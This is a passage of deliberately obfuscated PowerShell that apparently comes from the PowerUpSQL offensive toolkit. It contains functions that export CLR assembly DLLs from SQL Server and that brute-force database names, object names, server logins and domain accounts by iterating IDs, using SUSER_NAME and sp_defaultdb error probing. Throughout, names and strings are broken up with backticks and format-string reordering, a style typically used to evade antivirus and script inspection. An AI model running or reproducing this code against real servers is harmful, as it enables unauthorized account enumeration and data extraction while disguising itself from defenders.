 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FRO'+'M '+'sys.'+'assemb'+'l'+'ies '+'a '+'IN'+'N'+'ER '+'JOI'+'N '+'sy'+'s.a'+'ssembly_f'+'il'+'es '+'af'+' '+'O'+'N '+'a.'+'a'+'ss'+'embly_'+'id '+'= '+'a'+'f.a'+'s'+'sembly_id'+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$AssemblyNameQuery")

            
            ${tB`lAS`s`eMB`LyfIlest`emp} = &("{2}{3}{0}{1}" -f 'uer','y','Get-','SQLQ') -Instance ${i`NsTA`N`Ce} -Query ${qU`E`RY} -Username ${Us`erN`AmE} -Password ${pASS`wo`RD} -Credential ${CRE`DEnt`iaL} -SuppressVerbose

            
            ${tbL`AsS`Em`B`lyfILEstEmp} |
            &("{2}{3}{0}{1}"-f 'Obj','ect','F','orEach-') -Process {

                
                ${nu`ll} = ${t`BLASSEmB`LYF`IlES}."r`Ows"."a`Dd"(
                    [string]${Co`Mp`UTe`RnAme},
                    [string]${InS`T`ANCE},
                    [string]${d`Bn`AME},
                    [string]${_}."A`SsEMB`ly`_id",
                    [string]${_}."A`SSemB`l`Y_NAMe",
                    [string]${_}."FI`Le_`iD",
                    [string]${_}."fIle`_`NAmE",
                    [string]${_}."clr_`Na`mE",
                    [string]${_}."c`oNTenT",
                    [string]${_}."pE`RmiSsION_`Set_De`SC",
                    [string]${_}."C`R`e`AtE_date",
                    [string]${_}."MO`dify_da`TE",
                    [string]${_}."iS_`U`seR_DE`FIned")
                
                
                if(${exPORtF`o`LdeR}){

                    
                    ${Exp`ORT`Ou`T`PU`T`FOlDeR} = "$ExportFolder\CLRExports"
                    If ((&("{1}{0}{2}" -f'st-pat','te','h') ${exP`oRT`oUtPut`Fo`l`d`ER}) -eq ${F`A`Lse}){
                        &("{0}{2}{1}" -f 'Write','e','-Verbos') ("$instance "+': '+'Cre'+'a'+'ting '+'expor'+'t'+' '+'f'+'ol'+'der: '+"$ExportOutputFolder")
                        ${N`UlL} = &("{0}{1}{2}"-f 'Ne','w-Ite','m') -Path "$ExportOutputFolder" -type ("{2}{1}{0}"-f'y','irector','d')
                    }  
                    
                    
                    ${i`N`sTAn`CEcl`Ean} = ${instA`N`Ce} -replace('\\','_')
                    ${SErV`ERpa`Th} = "$ExportOutputFolder\$InstanceClean"
                    If ((&("{2}{0}{1}" -f 'st','-path','te') ${Serv`ERp`A`TH}) -eq ${f`ALsE}){
                        &("{0}{1}{2}"-f 'Wr','ite-Verbo','se') ("$instance "+': '+'Creati'+'n'+'g '+'serve'+'r'+' '+'fol'+'de'+'r: '+"$ServerPath")
                        ${n`ULl} = &("{2}{1}{0}"-f 'em','w-It','Ne') -Path "$ServerPath" -type ("{0}{1}" -f 'direc','tory')
                    }                   

                    
                    ${DATA`B`Ase`p`ATH} = "$ServerPath\$DbName"
                    If ((&("{2}{0}{1}{3}"-f 'es','t','t','-path') ${dAt`Ab`As`e`pATh}) -eq ${F`ALSE}){
                        &("{1}{0}{2}" -f 't','Wri','e-Verbose') ("$instance "+': '+'C'+'r'+'eatin'+'g '+'da'+'taba'+'se '+'fo'+'lde'+'r: '+"$Databasepath")
                        ${NU`ll} = &("{1}{0}{2}" -f'-I','New','tem') ${datA`BA`s`EPa`Th} -type ("{2}{0}{1}"-f'r','y','directo')
                    } 

                    
                    ${Cl`R`F`ileNaME} = ${_}."f`iLe`_NAme"
                    &("{0}{1}{3}{2}" -f 'W','rit','se','e-Verbo') ("$instance "+': '+'- '+'Ex'+'port'+'ing '+"$CLRFilename.dll")
                    ${FuLlE`XpOrtPa`TH} = "$Databasepath\$CLRFilename.dll"
                    ${_}."CO`Nt`ent" | &("{2}{1}{0}" -f'nt','et-Conte','S') -Encoding ("{0}{1}" -f'B','yte') ${F`Ul`Lex`PO`RTpATh}

                }                     
            }
        }
    }

    End
    {
        
        ${Tb`lassEMBlyFi`L`es}
    }
}








Function  gET-SQlfu`zZo`BjE`C`T`NAMe
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNdATORy = ${Fal`sE},
                VaLueFrOmPIpElineBYproPErtYNamE = ${tr`UE},
        HElPMESsaGE = {"{3}{2}{1}{6}{5}{7}{8}{4}{0}{9}{10}" -f'then','erv','L S','SQ','t to au','or ','er ','domain ac','coun','tica','te with.'})]
        [string]${usER`Na`Me},

        [Parameter(MandAtoRY = ${fa`L`se},
                valUEFRomPiPeliNeByprOPeRTYnAme = ${Tr`UE},
        HElpmeSsAGE = {"{7}{5}{10}{9}{0}{4}{1}{8}{2}{3}{6}"-f 'wo','to a','h','enticate w','rd ',' domain a','ith.','SQL Server or','ut','t pass','ccoun'})]
        [string]${p`A`SSWOrD},

        [Parameter(MANDAtoRy = ${F`AlSE},
        HeLpmESsaGE = {"{4}{3}{0}{2}{1}"-f 'ows cred','als.','enti','nd','Wi'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CreDe`N`TIaL} =  ( GEt-ItEM  vARiAble:0459M2).vAlue::"e`MPtY",

        [Parameter(ManDaTOry = ${f`Al`se},
                vaLuefROMPiPeLInEbyPrOpERtyName = ${TR`Ue},
        HelpMEsSAGe = {"{1}{3}{5}{7}{4}{2}{0}{6}" -f'on','SQL S','i','erver in','onnect','stance',' to.',' to c'})]
        [string]${InS`TancE},

        [Parameter(mAndAtOrY = ${f`ALsE},
        hELpMesSaGe = {"{8}{4}{7}{5}{3}{6}{1}{0}{2}"-f' wit','g','h.','t','ncip','tar',' fuzzin','al ID to s','Pri'})]
        [string]${s`TA`RTid} = 1,

        [Parameter(mAnDAtOrY = ${fAl`Se},
        HeLpmESsAge = {"{2}{6}{1}{3}{0}{5}{4}" -f 'fuzz','o ','Principal I','stop ',' on.','ing','D t'})]
        [string]${E`N`dId} = 300,

        [Parameter(ManDatorY = ${F`Al`Se},
        hELpmEssAge = {"{3}{1}{4}{11}{5}{0}{7}{9}{12}{10}{8}{6}{2}" -f'e','ppr','wrapped.','Su','ess ver','s','tion is ',' err','nc','ors.  Used when ','u','bo','f'})]
        [switch]${S`UPPress`Verb`O`SE}
    )

    Begin
    {
        
        ${TBLf`U`z`ZE`DoBjECts} = &("{2}{0}{1}" -f 'w-Obje','ct','Ne') -TypeName ("{1}{4}{3}{2}{0}"-f'aTable','Syste','t','ta.Da','m.Da')
    }

    Process
    {
        
        
        
        
        
        

        
        ${Co`MP`UT`eRnaMe} = &("{1}{4}{6}{8}{2}{7}{0}{3}{5}" -f's','G','ame','ta','et','nce','-Com','FromIn','puterN') -Instance ${iN`St`ANCE}

        
        if(-not ${iNsT`An`cE})
        {
            ${IN`STa`N`cE} = ${E`NV:`Com`puT`ER`NAme}
        }

        
        ${TES`TcO`NN`ecTIoN} = &("{3}{4}{5}{0}{1}{2}" -f'tio','n','Test','Get','-SQLConne','c') -Instance ${INS`TA`NcE} -Username ${u`s`eRN`Ame} -Password ${p`ASsW`Ord} -Credential ${crEDeN`T`IAL} -SuppressVerbose | &("{0}{1}{3}{2}"-f 'Wh','ere-','t','Objec') -FilterScript {
            ${_}."ST`Atus" -eq ("{0}{3}{2}{1}" -f'A','ble','ssi','cce')
        }
        if(${t`EsTCO`NneCtI`ON})
        {
            if( -not ${S`UpPre`ss`VeRb`OSE})
            {
                &("{2}{1}{0}" -f'rbose','ite-Ve','Wr') -Message ("$Instance "+': '+'Con'+'nect'+'i'+'on '+'Succ'+'es'+'s.')
                &("{0}{1}{2}{3}" -f'Writ','e-Verb','os','e') -Message ("$Instance "+': '+'Enumerat'+'ing'+' '+'ob'+'je'+'cts '+'fr'+'om '+'o'+'bje'+'ct '+'IDs'+'.'+'..')
            }
        }
        else
        {
            if( -not ${s`U`Pp`ReSSvErbOSE})
            {
                &("{3}{1}{0}{2}{4}"-f 'erb','e-V','o','Writ','se') -Message ("$Instance "+': '+'C'+'onnec'+'tio'+'n '+'Fai'+'l'+'ed.')
            }
            return
        }

        
        ${st`ArTid}..${ENd`id} |
        &("{2}{0}{4}{3}{1}"-f'O','t','ForEach-','c','bje') -Process {
            
            ${QuE`RY} = ('SELE'+'CT '+' '+' '+' '+"'$ComputerName' "+'a'+'s '+'[Co'+'mput'+'erName],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[I'+'n'+'st'+'ance]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$_' "+'as'+' '+'['+'Objec'+'tId],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"OBJECT_NAME($_) "+'a'+'s '+'[Obje'+'ctName'+']')

            
            ${tBlr`e`sUlTs} = &("{3}{2}{0}{1}"-f 'SQLQue','ry','-','Get') -Instance ${Ins`T`AnCe} -Query ${qU`ERY} -Username ${use`R`Name} -Password ${PaSS`WO`Rd} -Credential ${cr`eD`e`NTiAl} -SuppressVerbose

            ${obJec`TnA`mE} = ${tbLrEs`U`l`TS}."Ob`jE`c`TnaMe"
            if( -not ${suP`prESSveR`B`OsE})
            {
                if(${ObJe`c`T`Name}."l`E`NgTH" -ge 2)
                {
                    &("{1}{0}{2}" -f '-V','Write','erbose') -Message ("$Instance "+': '+'- '+'O'+'bject'+' '+'ID'+' '+"$_ "+'re'+'solv'+'ed '+'to'+': '+"$ObjectName")
                }
                else
                {
                    &("{1}{3}{2}{0}"-f 'e','Wr','-Verbos','ite') -Message ("$Instance "+': '+'- '+'Ob'+'ject'+' '+'ID'+' '+"$_ "+'res'+'olve'+'d '+'to'+': '+'')
                }
            }

            
            ${tBLfUZ`ZEdOBJ`E`CTs} = ${tbl`F`UZZEd`oBjE`CTS} + ${tblRe`SU`L`Ts}
        }
    }

    End
    {
        
        ${TBlfUzZ`e`DoBj`ects} | &("{2}{0}{1}{3}"-f 're','-Obje','Whe','ct') -FilterScript {
            ${_}."oBJectn`A`Me"."LE`NgTh" -ge 2
        }
    }
}






Function  Get-SQL`F`UZZDat`AB`ASE`NaMe
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mAnDaTOry = ${f`ALSE},
                vALueFRoMpIpeliNEBYProPertYNaMe = ${tR`Ue},
        hElPMESsAgE = {"{7}{10}{6}{4}{1}{3}{2}{5}{0}{11}{13}{9}{12}{8}" -f 't',' a','cou','c','ain','n','dom','SQL','ith.','uth',' Server or ',' to ','enticate w','a'})]
        [string]${U`SErNA`mE},

        [Parameter(mANDAtoRY = ${F`Alse},
                vAluEfrOMpipELinebyproPERtyNaMe = ${TR`Ue},
        HElpmeSSAGe = {"{5}{9}{1}{8}{6}{0}{4}{3}{2}{7}"-f ' account ','r ','to auth',' ','password','S','n','enticate with.','or domai','QL Serve'})]
        [string]${p`A`ssWOrd},

        [Parameter(manDaTORy = ${fA`lSe},
        heLPMESsAgE = {"{0}{4}{1}{5}{2}{3}" -f'Wind','ws cre','ntia','ls.','o','de'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CREde`N`TIaL} =  (  GeT-ItEm  VaRiABle:0459m2 ).VaLUe::"EmP`Ty",

        [Parameter(mAnDATOry = ${f`A`Lse},
                VALUefrompIPeliNeByPropErTynAMe = ${tR`Ue},
        hELPMeSsAGE = {"{8}{1}{7}{2}{10}{3}{0}{6}{9}{5}{4}"-f'nce','erv','r i','a','nection to.','con',' ','e','SQL S','to ','nst'})]
        [string]${ins`Ta`N`Ce},

        [Parameter(mandATOrY = ${f`AlsE},
        HeLPmeSSage = {"{6}{7}{1}{0}{8}{2}{5}{4}{3}{9}"-f 'l ID ','ipa','o ','g','t fuzzin','star','Prin','c','t',' with.'})]
        [string]${Sta`R`TiD} = 1,

        [Parameter(mAndATOrY = ${F`Al`se},
        hElPMESsAge = {"{3}{4}{7}{6}{0}{8}{5}{1}{2}"-f' ID to',' fuzzing ','on.','Pr','incip','op','l','a',' st'})]
        [string]${E`N`DID} = 300,

        [Parameter(MANdatorY = ${Fa`LSE},
        HElPMeSsage = {"{7}{5}{8}{10}{2}{6}{3}{1}{0}{11}{12}{9}{4}"-f'n f','.  Used whe','e ','ors','pped.',' ver','err','Suppress','b',' is wra','os','unct','ion'})]
        [switch]${Su`Pp`R`essvERBOse}
    )

    Begin
    {
        
        ${t`BlFu`ZzeDdbS} = &("{1}{2}{0}{3}"-f'Ob','New','-','ject') -TypeName ("{3}{4}{5}{6}{0}{1}{2}"-f'a','taTa','ble','Sys','te','m.Da','ta.D')
    }

    Process
    {
        
        ${cOmP`U`Te`RnAme} = &("{0}{1}{3}{4}{2}" -f'Get-','ComputerNameFr','ce','omInst','an') -Instance ${in`sTan`CE}

        
        if(-not ${iNS`T`Ance})
        {
            ${in`stan`ce} = ${ENv`:CO`mput`ErNA`mE}
        }

        
        ${t`e`stcOn`NeCTION} = &("{3}{2}{0}{1}"-f 'nTes','t','t-SQLConnectio','Ge') -Instance ${INsTA`N`ce} -Username ${US`ERna`Me} -Password ${Pa`s`SwORD} -Credential ${Cr`e`denTIAl} -SuppressVerbose | &("{2}{1}{0}"-f'ct','bje','Where-O') -FilterScript {
            ${_}."sTAT`Us" -eq ("{2}{1}{0}"-f 'ble','cessi','Ac')
        }
        if(${tES`T`cON`NecTioN})
        {
            if( -not ${suP`preSs`VE`RbOSE})
            {
                &("{2}{3}{0}{1}"-f 'os','e','Write-V','erb') -Message ("$Instance "+': '+'Connec'+'tion'+' '+'Succ'+'es'+'s.')
                &("{2}{3}{0}{1}{4}" -f 'e-V','erbo','W','rit','se') -Message ("$Instance "+': '+'Enu'+'mer'+'a'+'ting '+'dat'+'a'+'base '+'na'+'m'+'es '+'fro'+'m '+'da'+'tab'+'ase '+'IDs.'+'..')
            }
        }
        else
        {
            if( -not ${SU`p`PreSsve`RBOse})
            {
                &("{0}{2}{1}" -f'Write','erbose','-V') -Message ("$Instance "+': '+'Co'+'nnectio'+'n'+' '+'Fai'+'led'+'.')
            }
            return
        }

        
        ${s`T`ARtId}..${En`d`ID} |
        &("{2}{0}{1}"-f 'orEach-Obj','ect','F') -Process {
            
            ${q`UeRY} = ('SEL'+'E'+'CT '+' '+' '+' '+"'$ComputerName' "+'as'+' '+'[Com'+'pu'+'t'+'e'+'rName],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[In'+'stance'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$_' "+'a'+'s '+'[Dat'+'aba'+'seI'+'d],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"DB_NAME($_) "+'a'+'s '+'[Dat'+'a'+'ba'+'seName]')

            
            ${T`BLr`eSULTs} = &("{1}{0}{2}" -f'QLQuer','Get-S','y') -Instance ${IN`StAnce} -Query ${Q`U`eRy} -Username ${uS`e`RNAME} -Password ${pa`SS`WorD} -Credential ${C`REdENtI`Al} -SuppressVerbose

            ${Da`T`ABASENA`Me} = ${t`BLre`Su`LTs}."Data`Ba`senA`ME"
            if(${DA`T`A`BasenaMe}."LEN`G`TH" -ge 2)
            {
                if( -not ${SUpprE`ssVeR`B`o`SE})
                {
                    &("{1}{3}{2}{0}"-f 'e','Write-Ve','bos','r') -Message ("$Instance "+': '+'- '+'ID'+' '+"$_ "+'- '+'R'+'esolve'+'d '+'t'+'o: '+"$DatabaseName")
                }
            }
            else
            {
                if( -not ${su`pPR`Essv`ErB`ose})
                {
                    &("{1}{2}{0}"-f'ose','Write-V','erb') -Message ("$Instance "+': '+'- '+'I'+'D '+"$_ "+'- '+'Res'+'o'+'lved '+'to'+':')
                }
            }

            
            ${TBlF`UzzEdD`Bs} = ${TbL`FUzz`ed`dbs} + ${TB`L`RESulTS}
        }
    }

    End
    {
        
        ${T`B`LfUZ`ZeDdbs} | &("{1}{3}{0}{2}"-f'bj','Where-','ect','O') -FilterScript {
            ${_}."da`T`ABa`SenAme"."L`e`NgtH" -ge 2
        }
    }
}






Function  G`ET-`sQl`FuZzS`ErVerLO`gIN
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANdatOry = ${f`AlSe},
                ValUefRompiPElINeBYproPeRtYNamE = ${t`Rue},
        HELpmEssagE = {"{5}{6}{4}{3}{9}{0}{2}{7}{8}{1}"-f 'n a','th.','ccount to ',' or doma','Server','S','QL ','a','uthenticate wi','i'})]
        [string]${u`sEr`NamE},

        [Parameter(MANdAtory = ${fA`l`se},
                valUeFRompIpEliNebyprOPeRTYname = ${t`Rue},
        hELpMeSSAge = {"{11}{0}{12}{13}{5}{9}{4}{1}{2}{8}{3}{7}{14}{10}{6}"-f'Se','u','nt pas','d to','ain acco','r','h.',' authen','swor',' or dom','it','SQL ','rv','e','ticate w'})]
        [string]${paS`S`wORD},

        [Parameter(MANDATORy = ${FA`l`SE},
        heLPMEsSage = {"{3}{0}{1}{4}{2}"-f'ws cred','entia','s.','Windo','l'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRe`DEN`T`IAL} =   ( itEM vARiABLe:0459m2).vALuE::"E`mpTy",

        [Parameter(manDAtoRy = ${f`AL`Se},
                vALUefROMPIPELInEbyPrOPERTYNAmE = ${tr`Ue},
        HeLpMeSSaGE = {"{6}{5}{10}{1}{7}{2}{3}{8}{0}{4}{9}" -f 'ion ','tan','o','n','t','Se','SQL ','ce to c','nect','o.','rver ins'})]
        [string]${iNsT`A`NCe},

        [Parameter(mandatoRy = ${f`A`lSE},
        HELPmeSsAGe = {"{4}{1}{5}{3}{0}{2}" -f'IDs to f','ber','uzz.','cipal ','Num',' of Prin'})]
        [string]${fuZ`Znum} = 10000,

        [Parameter(maNdAtoRy = ${F`AL`se},
        hELPmeSSagE = {"{17}{5}{1}{14}{8}{9}{12}{4}{16}{6}{3}{0}{18}{15}{2}{10}{13}{11}{7}"-f'u',' the p','a erro','cco',', SQL ','f','r Windows a','tdb.','al type ','is','r analy','l',' role','sis of sp_defau','rincip',' vi','login, o','Try to determine i','nt'})]
        [switch]${gEt`pRI`NCiPAl`T`YPe},

        [Parameter(mANDatoRY = ${fAl`sE},
        helpmEsSaGe = {"{8}{10}{11}{7}{4}{14}{6}{2}{13}{0}{3}{1}{9}{5}{12}"-f'ion ','ra','when','is w','ose erro','ped',' ','erb','Suppress','p',' ','v','.',' funct','rs.  Used'})]
        [switch]${su`ppRES`sv`er`BoSE}
    )

    Begin
    {
        
        ${TBl`FUzZe`dLO`gI`NS} = &("{2}{0}{1}" -f 'Obj','ect','New-') -TypeName ("{5}{3}{1}{4}{2}{6}{0}"-f 'le','em.','.Data','st','Data','Sy','Tab')
        ${N`UlL} = ${T`BL`F`U`zz`eDLoginS}."cO`LUMnS".("{0}{1}"-f 'a','dd').Invoke(("{1}{0}{2}{3}"-f'ut','Comp','erNam','e'))
        ${n`Ull} = ${Tb`lfuzzeD`lO`ginS}."COlU`Mns".("{0}{1}" -f'a','dd').Invoke(("{1}{2}{0}"-f'ce','In','stan'))
        ${n`UlL} = ${tBL`FU`zzedL`OGiNs}."C`OluMns".("{0}{1}"-f'a','dd').Invoke(("{2}{0}{3}{1}" -f'rinci','lId','P','pa'))
        ${NU`ll} = ${tB`lfuZZe`DL`oGiNs}."COlUm`Ns".("{1}{0}"-f'dd','a').Invoke(("{1}{2}{0}"-f 'Name','Prin','ciple'))
        if(${Ge`TpRI`NC`IpA`lt`yPE})
        {
            ${n`UlL} = ${TB`lFUZZEDL`O`gINs}."COL`U`Mns".("{0}{1}"-f 'ad','d').Invoke(("{3}{1}{0}{2}" -f 'nc','i','ipleType','Pr'))
        }
    }

    Process
    {
        
        ${C`o`MpUTe`R`NAmE} = &("{0}{3}{6}{4}{1}{2}{5}"-f 'Get','t','erNameFromI','-Co','u','nstance','mp') -Instance ${inST`A`NCe}

        
        if(-not ${iNst`AN`ce})
        {
            ${In`stan`Ce} = ${Env:C`O`m`PUtEr`NaMe}
        }

        
        ${tEStConnEC`T`i`On} = &("{1}{2}{3}{4}{5}{0}"-f't','Ge','t-','SQLConnec','tion','Tes') -Instance ${in`STAn`CE} -Username ${uSer`NA`Me} -Password ${p`ASswOrD} -Credential ${crE`D`e`NtIaL} -SuppressVerbose | &("{1}{2}{0}" -f 'Object','W','here-') -FilterScript {
            ${_}."s`T`Atus" -eq ("{0}{1}{2}"-f 'A','ccess','ible')
        }
        if(${tEstcOn`NeCt`i`On})
        {
            if( -not ${S`UpP`RESSverbOSE})
            {
                &("{3}{0}{1}{2}" -f 'ri','te-V','erbose','W') -Message ("$Instance "+': '+'Co'+'nne'+'ction '+'Suc'+'ces'+'s.')
                &("{0}{1}{4}{2}{3}" -f 'Wri','te','e','rbose','-V') -Message ("$Instance "+': '+'Enumer'+'a'+'t'+'ing '+'p'+'rincip'+'al '+'names'+' '+'from'+' '+"$FuzzNum "+'pri'+'ncip'+'al '+'I'+'Ds..')
            }
        }
        else
        {
            if( -not ${SUp`p`ReSSVE`RB`oSe})
            {
                &("{2}{3}{1}{4}{0}" -f'bose','ite-V','W','r','er') -Message ("$Instance "+': '+'Co'+'nn'+'ection '+'Fail'+'ed.')
            }
            return
        }

        
        
        ${qU`eRY} = ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'EL'+'ECT '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$ComputerName' "+'as'+' '+'[Computer'+'Name'+'],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Insta'+'n'+'ce],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'n '+'[Pr'+'in'+'cipa'+'lId'+'], '+'SUSE'+'R_'+'NA'+'ME(n) '+'as'+' '+'[Pr'+'i'+'ncip'+'leName]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'fr'+'om '+'( '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'elec'+'t '+'t'+'op '+"$FuzzNum "+'ro'+'w_n'+'umbe'+'r() '+'over('+'o'+'rder'+' '+'by'+' '+'t1.'+'nu'+'m'+'ber) '+'a'+'s '+'N
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'f'+'rom '+' '+' '+'ma'+'st'+'er..'+'spt_val'+'ues '+'t'+'1 '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'cro'+'ss '+'join'+' '+'master..'+'spt'+'_'+'v'+'a'+'lues '+'t2
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+') '+'a'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'whe'+'r'+'e '+'S'+'USE'+'R_N'+'AM'+'E(n) '+'is'+' '+'no'+'t '+'n'+'ull')

        
        ${TBL`R`e`sults} = &("{3}{1}{0}{2}"-f 'LQue','t-SQ','ry','Ge') -Instance ${ins`TA`NCE} -Query ${Q`UeRy} -Username ${u`SerN`AME} -Password ${P`As`SwORD} -Credential ${creDE`NT`IAl} -SuppressVerbose

        
        ${T`B`Lre`Sults} |
        &("{1}{4}{0}{2}{3}"-f'E','F','a','ch-Object','or') {

            
            ${PRinc`ipA`l`NaME} = ${_}."prI`NC`iPl`ena`Me"
            ${pr`I`NcIpaL`iD} = ${_}."P`RInc`Ipa`lId"

            if(${G`et`p`RI`NCIPalTYPE})
            {
                ${rO`lECHeC`KqU`ErY} = ('E'+'XEC '+'master..'+'sp_'+'de'+'fau'+'ltdb'+' '+"'$PrincipalName', "+(('PwaN'+'O'+'T'+'AREAL'+'DATABASE12'+'34ABCD'+'Pw'+'a') -rEplaCe  'Pwa',[ChaR]39))
                ${Ro`l`ECHec`KreS`ULTS} = &("{0}{2}{1}{3}"-f'G','-SQLQ','et','uery') -Instance ${I`N`S`TAnce} -Query ${ROL`ech`eC`KQUERY} -Username ${us`ErNA`ME} -Password ${PA`ss`wOrd} -Credential ${CrED`E`NTi`AL} -SuppressVerbose -ReturnError

                
                if ((${rol`ec`heCKrEs`ULtS} -like ("{1}{4}{0}{2}{3}" -f 'BA','*NOTAR','SE','*','EALDATA')) -or (${ROLECHec`k`RESuL`Ts} -like ("{3}{4}{1}{2}{0}" -f 'gin*','he',' lo','*alter',' t')))
                {

                    if(${P`RI`NCI`P`ALnAme} -like '*\*')
                    {
                        ${pRiNCipAlT`y`pE} = ("{3}{0}{1}{2}"-f' A','ccoun','t','Windows')
                    }
                    else
                    {
                        ${P`RI`NciPaLtype} = ("{2}{1}{0}"-f 'gin',' Lo','SQL')
                    }
                }
                else
                {
                    ${priN`cI`P`AltY`pe} = ("{0}{2}{1}"-f 'SQL Se','ver Role','r')
                }
            }

            
            if(${get`PRINC`iPAltY`pe})
            {
                ${n`ULl} = ${tB`lf`UZzEdLO`GiNs}."Ro`ws".("{0}{1}"-f'A','dd').Invoke(${com`pUT`Er`NaME}, ${in`St`AnCe}, ${pRIN`c`ipa`liD}, ${PRI`NciPA`l`NAME}, ${Princi`pALT`y`pE})
            }
            else
            {
                ${n`ULl} = ${TbLFu`ZZeDLog`i`Ns}."ro`ws".("{1}{0}" -f 'dd','A').Invoke(${coMP`UT`E`RNAMe}, ${I`NstAnCe}, ${Pr`iN`CiPAl`id}, ${pRI`NciPa`lNamE})
            }

        }
    }

    End
    {
        
        ${tblF`Uz`zEDl`OGins} | &("{2}{0}{1}{3}"-f '-Ob','je','Where','ct') -FilterScript {
            ${_}."pR`inC`ipLE`NAmE"."Le`Ng`TH" -ge 2
        }
        
        if( -not ${Su`PpRES`s`VErbOSe})
        {
            &("{2}{0}{3}{1}{4}" -f'rit','os','W','e-Verb','e') -Message ("$Instance "+': '+'C'+'omplet'+'e.')
        }
    }
}






Function  GE`T-sq`L`Fu`zzD`OMain`A`CCOuNt
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNdaToRy = ${faL`sE},
                VAluefrOmpIPelIneByPRoPerTynAmE = ${t`RuE},
        hElpMESsAGe = {"{7}{5}{6}{2}{3}{1}{8}{4}{0}"-f'with.','in account to authent','r',' or doma','cate ','Se','rve','SQL ','i'})]
        [string]${u`sEr`NAmE},

        [Parameter(MANdATorY = ${F`A`LSE},
                ValuEFROmpipElINebypROPerTynaME = ${TR`Ue},
        HELPmeSSAGE = {"{10}{1}{11}{0}{9}{12}{6}{7}{5}{8}{2}{3}{4}"-f 'er','QL','rd',' to authenticat','e with.','c','doma','in ac','ount passwo','ve','S',' S','r or '})]
        [string]${pA`SS`woRd},

        [Parameter(maNdAToRy = ${F`AL`SE},
        HeLPmESsaGe = {"{1}{2}{3}{0}" -f'redentials.','Wind','ows ','c'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRE`DEN`TIal} =   (  get-iTeM ("V"+"Ari"+"AbLE:"+"04"+"59M2")  ).vAlue::"e`MPtY",

        [Parameter(MaNdATorY = ${f`AlSE},
                vALuEFrOMpIpeLiNEBYproPErtYnAme = ${tR`Ue},
        HelPMESsAGe = {"{2}{3}{5}{1}{0}{4}{6}{7}{8}" -f' to co','stance','S','QL Ser','nnection','ver in',' t','o','.'})]
        [string]${ins`T`AnCE},

        [Parameter(maNdatORy = ${F`AlSe},
        heLpmESSAGE = {"{4}{1}{6}{7}{0}{2}{5}{3}"-f'uzz','pal I','ing','ith.','Princi',' w','D to star','t f'})]
        [string]${STA`RT`iD} = 500,

        [Parameter(mAndaTorY = ${fa`LSe},
        HeLPMEsSAGE = {"{9}{7}{6}{0}{3}{4}{8}{1}{5}{2}"-f 'pa','top fu','zing on.','l ID',' to','z','nci','ri',' s','P'})]
        [string]${En`d`Id} = 1000,

        [Parameter(MaNDaTorY = ${fa`L`se},
        hElpMESSage = {"{4}{10}{18}{2}{14}{15}{9}{3}{13}{16}{17}{6}{5}{0}{8}{7}{11}{12}{1}" -f 'tr','.',' doma','rati','S','o target ','t','ted dom','us','r user enume','et a','a','ins','on','i','n fo','. Typically us','ed ',' custom'})]
        [string]${do`MAIn},
        
        [Parameter(manDAToRy = ${f`ALsE},
        HelPMesSAge = {"{4}{1}{10}{7}{5}{0}{9}{11}{6}{3}{8}{2}" -f 'U','s ',' wrapped.','ion ','Suppres','rors.  ','unct','er','is','s','verbose ','ed when f'})]
        [switch]${SU`ppreSSVEr`B`oSe}
    )

    Begin
    {
        
        ${T`BLF`UZz`eDAc`CouNtS} = &("{2}{0}{1}" -f 'ew-O','bject','N') -TypeName ("{3}{0}{2}{1}{4}"-f 'm.Data.Dat','Tabl','a','Syste','e')
    }

    Process
    {
        
        ${coM`puteR`N`AmE} = &("{0}{1}{4}{2}{3}" -f'G','et','romIns','tance','-ComputerNameF') -Instance ${inST`An`cE}

        
        if(-not ${i`N`st`ANcE})
        {
            ${in`StAN`cE} = ${e`N`V`:`computeRNa`me}
        }

        
        ${TesT`co`NneCTI`on} = &("{2}{1}{3}{5}{4}{0}" -f'st','L','Get-SQ','Connectio','Te','n') -Instance ${InsT`AN`CE} -Username ${useR`N`Ame} -Password ${PaS`s`WoRD} -Credential ${c`Re`dENtIAL} -SuppressVerbose | &("{2}{3}{1}{0}" -f'ect','j','Where','-Ob') -FilterScript {
            ${_}."ST`AT`Us" -eq ("{1}{0}{2}" -f'cessi','Ac','ble')
        }
